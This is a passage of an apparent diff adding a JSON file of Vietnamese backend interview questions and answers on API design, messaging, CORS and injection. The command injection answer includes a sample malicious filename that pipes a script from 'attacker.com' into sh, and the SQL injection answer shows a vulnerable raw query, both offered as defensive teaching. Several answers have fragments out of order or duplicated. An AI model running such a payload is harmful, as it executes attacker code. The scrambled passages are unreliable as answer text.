+        "Phần an toàn — thường là ý phỏng vấn muốn nghe:\n- Filter và sort đi thẳng vào SQL → phải allowlist tên field được lọc/sắp xếp. Không bao giờ nội suy chuỗi từ client vào ORDER BY; param hoá giá trị và map tên field qua bảng cố định.\n- Chỉ cho sort trên field có index, nếu không một request lạ sẽ quét toàn bảng.\n- page_size phải có giá trị mặc định và trần cứng (vd default 20, max 100) — không thì client gửi page_size=1000000.\n- fields phải lọc sau tầng phân quyền, đừng để client \"chọn\" ra field mà họ không được xem."
+      ],
+      "details": [],
+      "points": [
+        "Filter: field đơn giản thì đặt thẳng làm query param (status=paid). Cần biểu thức phức tạp thì dùng một param filter với cú pháp cố định (filter=status=paid AND total>100000) như Google API design guide, thay vì sinh ra status_in, total_gte, total_lte...",
+        "Sort: sort=-created_at,id — dấu - là giảm dần, nhiều key phân tách bằng dấu phẩy. Luôn thêm khoá phụ duy nhất (id) để thứ tự tất định, nếu không phân trang sẽ nhảy record.",
+        "Sparse fieldset: fields=id,total để client bớt payload. Với API có quan hệ, thêm include=customer (kiểu JSON:API) thay vì luôn nhồi mọi quan hệ vào response."
+      ],
+      "sections": [
+        "Giữ một quy ước duy nhất cho mọi collection endpoint, đừng mỗi endpoint một kiểu."
+      ],
+      "codeExamples": [
+        {
+          "language": "HTTP",
+          "code": "GET /orders?status=paid&created_after=2026-01-01\n     &sort=-created_at,id\n     &fields=id,total,customer.name\n     &page_size=50&page_token=eyJ..."
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 16,
+    "sourceSlug": "96758-endpoint-list-can-loc-sap-xep-va-chon-field-em-thiet-ke-query-param-the-nao-cho"
+  },
+  {
+    "id": "5207e240-231b-55b3-b005-73d6a4755598",
+    "question": "Endpoint export báo cáo chạy mất 3 phút nên hay bị timeout. Em thiết kế lại thế nào?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96759-endpoint-export-bao-cao-chay-mat-3-phut-nen-hay-bi-timeout-em-thiet-ke-lai-the-n",
+    "slug": "endpoint-export-bao-cao-chay-mat-3-phut-nen-hay-bi-timeout-em-thiet-ke-lai-the-nao-5207e240-231b-55b3-b005-73d6a4755598",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Sau đó client theo dõi bằng một trong hai cách:"
+      ],
+      "details": [
+        "Polling — GET /jobs/7c2 trả { \"status\": \"running\" | \"succeeded\" | \"failed\", \"progress\": 0.4 }. Khi xong thì trả kèm link tới kết quả (result_url là presigned URL của file trên object storage). Server nên trả Retry-After để client biết khoảng cách poll hợp lý, client dùng backoff thay vì poll mỗi 100ms.",
+        "Webhook / callback — client đăng ký URL, job xong thì server POST sang. Đỡ tốn request nhưng client phải có endpoint công khai và phải xử lý được retry, trùng lặp, xác thực chữ ký.",
+        "POST /reports",
+        "Thực tế nên hỗ trợ cả hai: webhook làm đường chính, polling làm đường dự phòng khi webhook rớt."
+      ],
+      "points": [],
+      "sections": [
+        "Chuyển từ request đồng bộ sang async job: nhận yêu cầu, trả ngay, xử lý nền, client theo dõi kết quả."
+      ],
+      "codeExamples": [
+        {
+          "language": "HTTP",
+          "code": "POST /reports\n{ \"type\": \"revenue\", \"from\": \"2026-01-01\", \"to\": \"2026-06-30\" }\n\nHTTP/1.1 202 Accepted\nLocation: /jobs/7c2\n{ \"job_id\": \"7c2\", \"status\": \"queued\" }"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 17,
+    "sourceSlug": "96759-endpoint-export-bao-cao-chay-mat-3-phut-nen-hay-bi-timeout-em-thiet-ke-lai-the-n"
+  },
+  {
+    "id": "7c202aa1-e25f-5cfe-a22d-8444fd27f006",
+    "question": "Cần endpoint cập nhật hàng loạt 500 bản ghi. Nếu 3 bản ghi lỗi thì trả status code gì?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96760-can-endpoint-cap-nhat-hang-loat-500-ban-ghi-neu-3-ban-ghi-loi-thi-tra-status-cod",
+    "slug": "can-endpoint-cap-nhat-hang-loat-500-ban-ghi-neu-3-ban-ghi-loi-thi-tra-status-code-gi-7c202aa1-e25f-5cfe-a22d-8444fd27f006",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Trước hết phải chốt ngữ nghĩa với bên gọi, vì đây là câu hỏi nghiệp vụ chứ không phải câu hỏi HTTP:",
+        "Điều quan trọng: đừng trả 200 rồi để client tự đoán, và cũng đừng trả 500 khi 497/500 bản ghi đã ghi thành công — 5xx sẽ khiến client retry cả lô và ghi đè lần nữa."
+      ],
+      "details": [
+        "Cách 1 — all-or-nothing (atomic). Cả batch chạy trong một transaction, một bản ghi lỗi thì rollback toàn bộ, trả 422 kèm danh sách bản ghi sai. Dễ hiểu, dữ liệu luôn nhất quán. Nhược điểm: batch lớn dễ bị một bản ghi rác chặn cả lô, và transaction dài gây khoá.",
+        "Cách 2 — partial success. Xử lý từng item độc lập, trả 200 (hoặc 207 Multi-Status) với kết quả từng item, thứ tự khớp với input:",
+        "Những thứ luôn cần kèm theo:\n- Giới hạn kích thước batch (vd tối đa 1000 item) và trả 413/400 khi vượt.\n- Idempotency key cho cả batch, hoặc client_reference_id cho từng item, để client retry an toàn phần lỗi.\n- Batch quá lớn thì đổi sang mô hình async job (202 + job id) thay vì cố xử lý trong một request."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "JSON",
+          "code": "HTTP/1.1 200 OK\n{\n  \"results\": [\n    { \"index\": 0, \"id\": \"a1\", \"status\": 200 },\n    { \"index\": 1, \"status\": 422,\n      \"error\": { \"type\": \".../validation\", \"detail\": \"price must be > 0\" } },\n    { \"index\": 2, \"id\": \"a3\", \"status\": 200 }\n  ],\n  \"succeeded\": 497, \"failed\": 3\n}"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 18,
+    "sourceSlug": "96760-can-endpoint-cap-nhat-hang-loat-500-ban-ghi-neu-3-ban-ghi-loi-thi-tra-status-cod"
+  },
+  {
+    "id": "5f1f76cf-6a79-53f6-90e0-08492a248453",
+    "question": "Retry khi consumer xử lý lỗi nên làm thế nào? Vì sao cần exponential backoff và jitter?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96854-retry-khi-consumer-xu-ly-loi-nen-lam-the-nao-vi-sao-can-exponential-backoff-va-j",
+    "slug": "retry-khi-consumer-xu-ly-loi-nen-lam-the-nao-vi-sao-can-exponential-backoff-va-jitter-5f1f76cf-6a79-53f6-90e0-08492a248453",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Retry ngay lập tức và không giới hạn là cách nhanh nhất để biến một sự cố nhỏ thành sự cố lớn: service phía sau đang quá tải lại nhận thêm lưu lượng retry.",
+        "Phân loại lỗi trước khi retry:\n- Lỗi tạm thời (timeout, 503, deadlock, mất kết nối) → retry.\n- Lỗi vĩnh viễn (payload sai định dạng, validation fail, 400, bản ghi không tồn tại) → không retry, đẩy thẳng vào DLQ. Retry loại này chỉ đốt tài nguyên."
+      ],
+      "details": [
+        "Exponential backoff — giãn khoảng chờ theo cấp số nhân (1s, 2s, 4s, 8s...) và chặn bằng trần maxDelay, cho hệ thống phía sau thời gian hồi phục.",
+        "Jitter — thêm ngẫu nhiên vào khoảng chờ. Nếu không có jitter, hàng nghìn consumer cùng lỗi tại một thời điểm sẽ cùng retry đúng mốc 1s, 2s, 4s và tạo ra các đợt tải dồn cục. Biến thể hay dùng là full jitter:",
+        "Kèm theo: giới hạn số lần (thường 3-5), gắn retry_count vào header message, retry ở tầng ngoài queue (queue retry riêng) thay vì Thread.sleep giữ luôn consumer, và luôn có đích đến cuối cùng là DLQ."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "JAVA",
+          "code": "long delay = ThreadLocalRandom.current()\n    .nextLong(Math.min(maxDelay, base * (1L << attempt)));"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 19,
+    "sourceSlug": "96854-retry-khi-consumer-xu-ly-loi-nen-lam-the-nao-vi-sao-can-exponential-backoff-va-j"
+  },
+  {
+    "id": "84257ea9-a3a3-51f8-9a40-179dafbdbbc8",
+    "question": "Consumer xử lý chậm hơn producer trong thời gian dài thì xử lý thế nào?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96860-consumer-xu-ly-cham-hon-producer-trong-thoi-gian-dai-thi-xu-ly-the-nao",
+    "slug": "consumer-xu-ly-cham-hon-producer-trong-thoi-gian-dai-thi-xu-ly-the-nao-84257ea9-a3a3-51f8-9a40-179dafbdbbc8",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Đầu tiên phải phân biệt hai tình huống, vì cách xử lý khác hẳn nhau."
+      ],
+      "details": [
+        "Chậm tạm thời (đợt cao điểm) — queue chính là bộ đệm, đó là công dụng của nó. Chỉ cần đủ dung lượng lưu trữ và giám sát để biết khi nào backlog tiêu hết. Không cần làm gì thêm.",
+        "Chậm kéo dài (công suất consumer < tốc độ producer) — queue không cứu được, chỉ làm độ trễ tăng vô hạn. Backlog càng lớn thì càng khó tiêu vì message mới xếp sau backlog, và khi hết dung lượng thì broker chặn producer hoặc bắt đầu loại message.",
+        "Có một hàng đợi backlog dài mà không có kế hoạch tiêu thụ thì chỉ là dời sự cố sang tương lai.",
+        "Các hướng xử lý:"
+      ],
+      "points": [
+        "Tăng công suất tiêu thụ: thêm consumer (Kafka: tối đa bằng số partition; RabbitMQ: thêm consumer trên cùng queue là được), gom lô ghi DB, bỏ các lệnh gọi đồng bộ không cần thiết.",
+        "Giới hạn nhận vào: prefetch/max.poll.records giữ số message in-flight ở mức consumer thật sự xử lý nổi, để broker không đẩy quá tay và message không bị timeout khi nằm chờ trong bộ nhớ consumer.",
+        "Tách hàng đợi theo mức ưu tiên: đơn hàng và email khuyến mãi không nên chung queue. Khi backlog lớn, luồng quan trọng vẫn phải chạy được.",
+        "Loại bỏ có chủ đích (load shedding): message quá hạn ý nghĩa (thông báo real-time cũ 30 phút) thì bỏ, đừng xử lý cho đủ. Đặt TTL cho loại message này.",
+        "Giảm tải đầu vào: rate limit hoặc chặn tạm ở tầng API khi backlog vượt ngưỡng, có kiểm soát vẫn hơn để broker tự đầy."
+      ],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 20,
+    "sourceSlug": "96860-consumer-xu-ly-cham-hon-producer-trong-thoi-gian-dai-thi-xu-ly-the-nao"
+  },
+  {
+    "id": "d216b4c5-23fa-5ae3-8907-f2e5d88cc7ad",
+    "question": "Kafka, RabbitMQ và Redis Stream — với một bài toán cụ thể bạn chọn cái nào và vì sao?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/96861-kafka-rabbitmq-va-redis-stream-voi-mot-bai-toan-cu-the-ban-chon-cai-nao-va-vi-sa",
+    "slug": "kafka-rabbitmq-va-redis-stream-voi-mot-bai-toan-cu-the-ban-chon-cai-nao-va-vi-sao-d216b4c5-23fa-5ae3-8907-f2e5d88cc7ad",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Chọn theo cách dữ liệu được tiêu thụ, không theo độ phổ biến."
+      ],
+      "details": [
+        "Kafka — log phân tán, message được giữ lại theo retention và consumer đọc bằng offset. Chọn khi:\n- Cần replay: thêm service mới muốn đọc lại lịch sử, hoặc phải chạy lại sau khi sửa bug.\n- Nhiều nhóm consumer độc lập cùng đọc một luồng, mỗi nhóm giữ offset riêng.\n- Throughput rất cao, cần thứ tự theo key, hoặc cần stream processing.\nĐánh đổi: vận hành nặng hơn, không có định tuyến linh hoạt, không có retry/DLQ sẵn ở tầng broker.",
+        "RabbitMQ — message broker cổ điển, message biến mất sau khi ack. Chọn khi:\n- Cần định tuyến linh hoạt (topic/headers exchange), fan-out theo quy tắc.\n- Task queue: job nền, gửi mail, xử lý ảnh — mỗi việc chỉ một worker làm.\n- Cần TTL, priority, per-message ack, DLX sẵn có.\nĐánh đổi: không phù hợp để lưu trữ và replay lịch sử (dù stream của RabbitMQ đã thu hẹp khoảng cách này).",
+        "Redis Stream — cấu trúc dữ liệu trong Redis, có consumer group và ack. Chọn khi:\n- Đã có Redis trong hệ thống, khối lượng vừa phải, muốn tránh thêm một hạ tầng phải vận hành.\n- Độ trễ cực thấp, chấp nhận rủi ro mất dữ liệu ở mức persistence của Redis.\nĐánh đổi: dữ liệu nằm trong bộ nhớ nên phải giới hạn độ dài stream; đảm bảo bền vững yếu hơn hai lựa chọn trên."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 21,
+    "sourceSlug": "96861-kafka-rabbitmq-va-redis-stream-voi-mot-bai-toan-cu-the-ban-chon-cai-nao-va-vi-sa"
+  },
+  {
+    "id": "777c7a9c-683e-541e-9fda-fa07d7041b23",
+    "question": "Gọi API cross-origin bằng fetch với credentials: 'include' thì server phải trả về những header gì?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/97506-goi-api-cross-origin-bang-fetch-voi-credentials-include-thi-server-phai-tra-ve-n",
+    "slug": "goi-api-cross-origin-bang-fetch-voi-credentials-include-thi-server-phai-tra-ve-nhung-header-gi-777c7a9c-683e-541e-9fda-fa07d7041b23",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Khi request mang cookie cross-origin, trình duyệt siết quy tắc chặt hơn bình thường. Server phải trả đủ hai header:",
+        "Phía cookie cũng phải hợp lệ: SameSite=None; Secure, nếu không trình duyệt sẽ không đính kèm dù CORS đã đúng — đây là nguyên nhân phổ biến nhất của lỗi \"chạy local ổn, lên staging mất session\"."
+      ],
+      "details": [
+        "Nếu là preflight, response OPTIONS cũng phải lặp lại hai header trên, và Access-Control-Allow-Headers cũng không được dùng * khi có credentials.",
+        "Lưu ý thêm: mặc định JS chỉ đọc được vài response header cơ bản. Muốn đọc header tự định nghĩa (vd X-Total-Count) phải khai Access-Control-Expose-Headers."
+      ],
+      "points": [
+        "Access-Control-Allow-Origin: https://app.example.com — phải là origin cụ thể, dùng * sẽ bị chặn.",
+        "Access-Control-Allow-Credentials: true.",
+        "Access-Control-Allow-Credentials: true"
+      ],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "JS",
+          "code": "await fetch('https://api.example.com/me', {\n  credentials: 'include', // send cookies cross-origin\n})"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 22,
+    "sourceSlug": "97506-goi-api-cross-origin-bang-fetch-voi-credentials-include-thi-server-phai-tra-ve-n"
+  },
+  {
+    "id": "85abb22b-85fa-5032-8c92-b5915da4fd1f",
+    "question": "Giữa hai service nên dùng REST, gRPC hay message queue? Căn cứ chọn là gì?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98255-giua-hai-service-nen-dung-rest-grpc-hay-message-queue-can-cu-chon-la-gi",
+    "slug": "giua-hai-service-nen-dung-rest-grpc-hay-message-queue-can-cu-chon-la-gi-85abb22b-85fa-5032-8c92-b5915da4fd1f",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Câu hỏi đầu tiên không phải chọn giao thức mà là: người gọi có cần kết quả ngay mới đi tiếp được không?"
+      ],
+      "details": [
+        "Đồng bộ (REST / gRPC) — cần kết quả để xử lý tiếp: kiểm tra tồn kho trước khi tạo đơn, xác thực token. Đổi lại, người gọi phụ thuộc tính sẵn sàng của người bị gọi và cộng dồn latency.",
+        "Bất đồng bộ (message / event) — không cần kết quả ngay: gửi email xác nhận, cập nhật số liệu, đồng bộ sang search index. Người gọi ghi message rồi trả về ngay; broker giữ message nên bên nhận chết tạm thời cũng không mất việc. Đổi lại: eventual consistency, phải xử lý trùng message (idempotent) và cần DLQ cho message hỏng.",
+        "Thực tế hay gặp: REST cho API ra ngoài / cho frontend, gRPC cho gọi nội bộ giữa service (nhất là chặng gọi nhiều, cần latency thấp và hợp đồng chặt), message cho mọi việc chạy nền và cho phát tán sự kiện tới nhiều bên."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": [
+        {
+          "cells": [
+            "REST/JSON",
+            "gRPC",
+            "Payload",
+            "Text, tự mô tả",
+            "Protobuf nhị phân, nhỏ và nhanh hơn",
+            "Hợp đồng",
+            "OpenAPI (tuỳ chọn)",
+            ".proto bắt buộc, sinh code hai đầu",
+            "Streaming",
+            "Hạn chế",
+            "Hỗ trợ hai chiều sẵn",
+            "Dùng từ trình duyệt",
+            "Trực tiếp",
+            "Cần gRPC-Web/proxy"
+          ]
+        }
+      ]
+    },
+    "legacyId": 23,
+    "sourceSlug": "98255-giua-hai-service-nen-dung-rest-grpc-hay-message-queue-can-cu-chon-la-gi"
+  },
+  {
+    "id": "11d1c0cf-b482-5389-a8b7-d721f296ebc8",
+    "question": "API gateway nên đảm nhận việc gì và tuyệt đối không nên nhét việc gì vào?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98256-api-gateway-nen-dam-nhan-viec-gi-va-tuyet-doi-khong-nen-nhet-viec-gi-vao",
+    "slug": "api-gateway-nen-dam-nhan-viec-gi-va-tuyet-doi-khong-nen-nhet-viec-gi-vao-11d1c0cf-b482-5389-a8b7-d721f296ebc8",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Gateway là cửa ngõ duy nhất cho client vào hệ thống, xử lý các mối quan tâm cắt ngang — thứ mọi service đều cần và không nên viết lại 10 lần."
+      ],
+      "details": [
+        "Nên làm:\n- Định tuyến request tới service phù hợp; ẩn cấu trúc nội bộ khỏi client.\n- Xác thực (kiểm tra token, dừng request vô danh ngay tại cửa) — nhưng phân quyền chi tiết theo nghiệp vụ vẫn thuộc service.\n- Rate limiting, chống lạm dụng, terminate TLS.\n- Log truy cập, sinh correlation id, đo metric ở biên.\n- Ghép vài lời gọi đơn giản (gateway aggregation) để client mobile bớt round-trip.",
+        "Không nên làm:\n- Logic nghiệp vụ (tính giá, kiểm tra tồn kho, quy tắc giảm giá). Nhét vào đây thì mọi thay đổi nghiệp vụ phải deploy gateway — thành monolith mới ở tầng ngoài, và là điểm nghẽn giữa các team.\n- Truy cập thẳng database của service.\n- Biến đổi dữ liệu phức tạp riêng cho một client — việc đó thuộc BFF.\n- Ghép hàng chục lời gọi tạo chuỗi đồng bộ dài.",
+        "Điểm cần nói thêm khi phỏng vấn: gateway là single point of failure — phải chạy nhiều instance sau load balancer, có health check, và phải giữ mỏng để không thành điểm nghẽn latency. Đội nào cũng phải chờ merge vào gateway để ra tính năng là dấu hiệu gateway đã ôm quá nhiều."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 24,
+    "sourceSlug": "98256-api-gateway-nen-dam-nhan-viec-gi-va-tuyet-doi-khong-nen-nhet-viec-gi-vao"
+  },
+  {
+    "id": "aefbeeb5-4bb4-5239-bd95-53df7dfed2f9",
+    "question": "BFF (Backend for Frontend) là gì? Có gateway rồi thì thêm BFF để làm gì?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98257-bff-backend-for-frontend-la-gi-co-gateway-roi-thi-them-bff-de-lam-gi",
+    "slug": "bff-backend-for-frontend-la-gi-co-gateway-roi-thi-them-bff-de-lam-gi-aefbeeb5-4bb4-5239-bd95-53df7dfed2f9",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "BFF là một backend riêng cho từng loại client (web, iOS/Android, màn hình nội bộ), do chính đội frontend đó sở hữu, đứng giữa client và các service nghiệp vụ."
+      ],
+      "details": [
+        "Vấn đề nó giải quyết: một API dùng chung cho mọi client luôn sai với ai đó. Mobile cần payload nhỏ, ít round-trip, ảnh kích thước khác; web desktop cần nhiều trường hơn. Nếu chỉ có một API chung thì hoặc mobile phải gọi 6 lần và bỏ 80% dữ liệu, hoặc API chung phình lên vì tham số điều kiện cho từng client — và mỗi lần web đổi UI lại phải sửa API mà mobile đang dùng.",
+        "BFF làm gì: gọi các service phía sau, ghép và cắt gọt dữ liệu đúng theo màn hình của client mình, giữ trạng thái phiên phía server nếu cần.",
+        "Khác gateway: gateway là một lớp cắt ngang chung (auth, rate limit, routing) cho mọi client. BFF là nhiều lớp, mỗi cái phục vụ một client và chứa được logic trình bày. Thường dùng cả hai: client → gateway → BFF → services."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 25,
+    "sourceSlug": "98257-bff-backend-for-frontend-la-gi-co-gateway-roi-thi-them-bff-de-lam-gi"
+  },
+  {
+    "id": "10b24148-682f-5fb2-99e6-667e1f919c06",
+    "question": "Cần đổi response của một API mà 4 service khác đang gọi — làm thế nào để không phá ai?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98260-can-doi-response-cua-mot-api-ma-4-service-khac-dang-goi-lam-the-nao-de-khong-pha",
+    "slug": "can-doi-response-cua-mot-api-ma-4-service-khac-dang-goi-lam-the-nao-de-khong-pha-ai-10b24148-682f-5fb2-99e6-667e1f919c06",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Nguyên tắc: thay đổi tương thích ngược thì không cần version mới; thay đổi phá vỡ thì phải chạy song song hai phiên bản một thời gian."
+      ],
+      "details": [
+        "Thay đổi an toàn (thêm, không bỏ): thêm trường mới, thêm giá trị enum có xử lý mặc định, thêm endpoint. Điều kiện là consumer viết theo kiểu tolerant reader — chỉ đọc trường mình cần, bỏ qua trường lạ thay vì fail khi gặp field không biết. Nếu consumer dùng deserializer strict (lỗi khi có field thừa), thì việc thêm trường cũng thành breaking change. Đây là thứ phải thống nhất từ đầu.",
+        "Thay đổi phá vỡ: bỏ/đổi tên trường, đổi kiểu dữ liệu, đổi ngữ nghĩa (amount từ đồng sang xu), siết validation. Quy trình:\n1. Expand — thêm cái mới, giữ nguyên cái cũ, ghi cả hai (total và total_cents).\n2. Publish v2 (/v2/orders hoặc header version), thông báo lịch ngừng hỗ trợ.\n3. Theo dõi metric theo phiên bản để biết ai còn dùng v1 — không dựa vào trí nhớ.\n4. Contract — khi lưu lượng v1 về 0 mới xoá.",
+        "Điểm hay bị hỏi thêm: deploy không bao giờ đồng thời, nên trong lúc rollout luôn có phiên bản cũ và mới chạy cùng lúc → mọi thay đổi phải sống được ở trạng thái trộn. Với event/message cũng vậy: schema event là hợp đồng công khai, dùng schema registry và quy tắc tương thích thay vì sửa tại chỗ."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [],
+      "tables": []
+    },
+    "legacyId": 26,
+    "sourceSlug": "98260-can-doi-response-cua-mot-api-ma-4-service-khac-dang-goi-lam-the-nao-de-khong-pha"
+  },
+  {
+    "id": "7a9924fa-c54d-5f28-9f08-13840d8db249",
+    "question": "Dự án dùng ORM (Prisma/TypeORM/Hibernate) thì còn dính SQL injection được không? Chỗ nào là chỗ hở?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98654-du-an-dung-orm-prisma-typeorm-hibernate-thi-con-dinh-sql-injection-duoc-khong-ch",
+    "slug": "du-an-dung-orm-prisma-typeorm-hibernate-thi-con-dinh-sql-injection-duoc-khong-cho-nao-la-cho-ho-7a9924fa-c54d-5f28-9f08-13840d8db249",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Có. ORM chỉ an toàn ở phần nó tự sinh câu lệnh; mọi chỗ bạn tự ghép chuỗi đều quay lại rủi ro cũ.",
+        "2. ORDER BY / tên cột / tên bảng động. Đây là chỗ placeholder không dùng được — parameter chỉ thay được giá trị, không thay được định danh."
+      ],
+      "details": [
+        "1. Raw query nối chuỗi. Escape hatch của ORM ($queryRawUnsafe, createQuery với chuỗi, query() của driver) không tự tham số hoá.",
+        "Ba chỗ hở hay gặp:",
+        "Bắt buộc phải allowlist:",
+        "Còn một loại nữa ít gặp hơn: second-order injection — dữ liệu độc được lưu sạch vào DB, nhưng sau đó một job đọc ra và ghép vào câu lệnh khác."
+      ],
+      "points": [],
+      "sections": [],
+      "codeExamples": [
+        {
+          "language": "TS",
+          "code": "// vulnerable\nawait prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`)\n\n// safe: tagged template binds parameters\nawait prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`"
+        },
+        {
+          "language": "TS",
+          "code": "const SORTABLE = { created: 'created_at', name: 'full_name' } as const\nconst column = SORTABLE[req.query.sort as keyof typeof SORTABLE] ?? 'created_at'\nconst dir = req.query.dir === 'asc' ? 'ASC' : 'DESC'"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 27,
+    "sourceSlug": "98654-du-an-dung-orm-prisma-typeorm-hibernate-thi-con-dinh-sql-injection-duoc-khong-ch"
+  },
+  {
+    "id": "15896dbb-3378-5708-80ac-2c2b6ef00f7c",
+    "question": "Tính năng convert ảnh gọi ImageMagick qua shell với tên file do user đặt. Rủi ro gì và viết lại thế nào?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98655-tinh-nang-convert-anh-goi-imagemagick-qua-shell-voi-ten-file-do-user-dat-rui-ro",
+    "slug": "tinh-nang-convert-anh-goi-imagemagick-qua-shell-voi-ten-file-do-user-dat-rui-ro-gi-va-viet-lai-the-n-15896dbb-3378-5708-80ac-2c2b6ef00f7c",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "execFile/spawn (với shell: false, là mặc định) truyền mảng đối số thẳng cho tiến trình con, không qua shell nên không có gì để diễn giải. Java tương ứng là ProcessBuilder với list argument, Python là subprocess.run([...], shell=False)."
+      ],
+      "details": [
+        "Vẫn phải làm thêm:\n- Không dùng tên file của user làm tên trên đĩa. Sinh tên ngẫu nhiên (UUID) + phần mở rộng suy ra từ content type đã kiểm tra; giữ tên gốc trong DB để hiển thị.\n- Allowlist đối số: kích thước, format là giá trị từ enum của bạn, không phải chuỗi user truyền vào.\n- Tên bắt đầu bằng - vẫn bị hiểu là flag dù không qua shell → chặn bằng bước sinh tên ở trên, hoặc thêm --.\n- Chạy tiến trình với quyền tối thiểu, timeout, và giới hạn tài nguyên.",
+        "Tốt nhất là dùng thư viện trong tiến trình (sharp, Pillow) thay vì gọi binary ngoài — không có shell thì không có command injection."
+      ],
+      "points": [],
+      "sections": [
+        "Rủi ro là command injection: khi chuỗi được đưa qua shell, các ký tự ;, |, &&, $(...), backtick được shell diễn giải thành lệnh mới, chạy dưới quyền của process ứng dụng.",
+        "Cách viết lại — bỏ shell đi:"
+      ],
+      "codeExamples": [
+        {
+          "language": "JS",
+          "code": "// vulnerable: goes through /bin/sh\nexec(`convert ${input} -resize 800x out.jpg`)\n// input = \"a.jpg; curl attacker.com/x.sh | sh\""
+        },
+        {
+          "language": "JS",
+          "code": "import { execFile } from 'node:child_process'\n\nexecFile('convert', [input, '-resize', '800x', out], callback)"
+        }
+      ],
+      "tables": []
+    },
+    "legacyId": 28,
+    "sourceSlug": "98655-tinh-nang-convert-anh-goi-imagemagick-qua-shell-voi-ten-file-do-user-dat-rui-ro"
+  },
+  {
+    "id": "8921d6bd-6c5e-56fd-9d99-f9c429754ff0",
+    "question": "Frontend đã validate form bằng Zod rồi, backend còn cần validate lại không? Validate ở server nên làm thế nào cho đúng?",
+    "level": "intermediate",
+    "levelLabel": "TRUNG BÌNH",
+    "sourceUrl": "https://luyenphongvan.online/q/98657-frontend-da-validate-form-bang-zod-roi-backend-con-can-validate-lai-khong-valida",
+    "slug": "frontend-da-validate-form-bang-zod-roi-backend-con-can-validate-lai-khong-validate-o-server-nen-lam-8921d6bd-6c5e-56fd-9d99-f9c429754ff0",
+    "access": "free",
+    "upgrade": null,
+    "departments": [
+      "backend"
+    ],
+    "answer": {
+      "summary": [
+        "Cần, và đây là bắt buộc tuyệt đối. Validate ở client là trải nghiệm người dùng, không phải kiểm soát bảo mật — client nằm hoàn toàn trong tay người dùng, ai cũng gọi thẳng API bằng curl hay Postman được, bỏ qua toàn bộ form.",
+        "Dùng chung schema giữa client và server là cách tốt để không lệch, nhưng chia sẻ schema không đồng nghĩa bỏ được lần chạy ở server."
+      ],
+      "details": [
+        "Nguyên tắc validate ở server:\n- Allowlist, không blocklist. Mô tả cái gì hợp lệ (kiểu, khoảng giá trị, độ dài, tập giá trị cho phép) thay vì liệt kê cái gì bị cấm — danh sách cấm luôn thiếu.\n- Parse, đừng chỉ kiểm tra. Dùng schema trả về object đã được ép kiểu và cắt gọn, rồi chỉ dùng object đó cho phần còn lại của handler."
+      ],
+      "points": [
+        ".strict() / whitelist trường để field lạ không lọt xuống tầng dưới.",
